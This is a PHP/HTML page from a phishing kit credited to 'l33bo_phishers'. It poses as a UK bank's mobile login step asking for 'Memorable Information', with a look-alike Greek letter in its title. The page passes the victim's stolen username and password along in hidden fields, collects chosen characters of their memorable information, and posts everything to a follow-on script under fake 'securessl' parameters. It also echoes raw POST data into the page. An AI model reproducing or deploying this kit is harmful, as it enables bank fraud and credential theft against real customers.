<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
require_once("assets/includes/memo.php");
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<title>Mobile &Beta;anking : Login</title>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="en-gb" http-equiv="content-language">
<meta content="width=device-width" name="viewport">
<link href="" media="handheld" rel="alternate">
<link href="./assets/img/001.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="./assets/img/002.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="./assets/img/001.ico" rel="shortcut icon">
<link href="./assets/css/001.css" rel="stylesheet" type="text/css">
<script src="./assets/js/001.jspf" type="text/javascript"></script>
<script src="./assets/js/001.js" type="text/javascript"></script>
<style>
.error_strings {
    margin: 0px;
    padding: 0px 20px 0px 30px;
    color: #db0000;
    font-size: 16px;
}
</style>
</head>
<body>
<div id="outer">
<div id="banner">
<p id="logo"><img src="./assets/img/001.gif"></p>
<p id="userstatusNGB"><img src="./assets/img/002.gif"></p>
<p class="cookiePolicy"><a href="#" id="lnkePrivacy" name="lnkePrivacy">Cookie policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Memorable Information</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">                                                                           
<div class="panelInner">
<div class="inner">
<p class="sudoLabel">Please select characters below.</p>
<form id="frmEnterMemorableInformation1" name="frmEnterMemorableInformation1" method="post" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="username" value="<?php echo $_POST['user']?>">
<input type="hidden" name="password" value="<?php echo $_POST['pass']?>">
<div class="memorableInfo">
<div class="formField">
<div class="formField">
<label for="frmEnterMemorableInformation1:formMem1">1st:</label>
<select id="frmEnterMemorableInformation1:formMem1" name="frmEnterMemorableInformation1:formMem1" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="formField">
<div class="formField">
<label for="frmEnterMemorableInformation1:formMem2">4th:</label>
<select id="frmEnterMemorableInformation1:formMem2" name="frmEnterMemorableInformation1:formMem2" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="formField">
<div class="formField">
<label for="frmEnterMemorableInformation1:formMem3">6th:</label>
<select id="frmEnterMemorableInformation1:formMem3" name="frmEnterMemorableInformation1:formMem3" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="clearer"></div>
</div>
<div class="divider">
<hr>
</div>
<div class="actions">
<input id="frmEnterMemorableInformation1:lnkSubmit" name="frmEnterMemorableInformation1:lnkSubmit" type="submit" value="Submit" title="Submit" class="submitAction">
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev2PCancel"><a id="frmEnterMemorableInformation1:lnkCancel" name="frmEnterMemorableInformation1:lnkCancel" href="#" class="blockLink">Cancel</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<center>
<a class="newwin" href="#"><img src="./assets/img/003.jpg"></a><br></div>
</center>
</div>
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk1" name="lnk1">Register for&#160;Online Banking</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="../Loginmb.php?&sessionid=<?php echo generateRandomString(30); ?>&securessl=true" id="lnk1" name="lnk1" title="View desktop site">Go&#160;to&#160;desktop site</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk2" name="lnk2">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk3" name="lnk3">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk4" name="lnk4">Contact us</a></p>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote"><a href="#" id="lnkBookmark" name="lnkBookmark">Mobile Banking</a></p>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img alt="FSCS" src="./assets/img/001.png"></a></p>
</div>
</div>
<div class="clearer"></div>
<div><input name="smartAppForIosAndAndroid" type="hidden" value="true"> <input name="smartAppForIosAbvSix" type="hidden" value="true">
<div class="footerLinksLogin">
<a href="#" id="unauth:lnksecurity" name="unauth:lnksecurity" title="Security">Security</a>
&#160;
<a class="footerLinksLast" href="#" id="unauth:lnkLegal" name="unauth:lnkLegal" title="Legal">Legal</a></div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
?>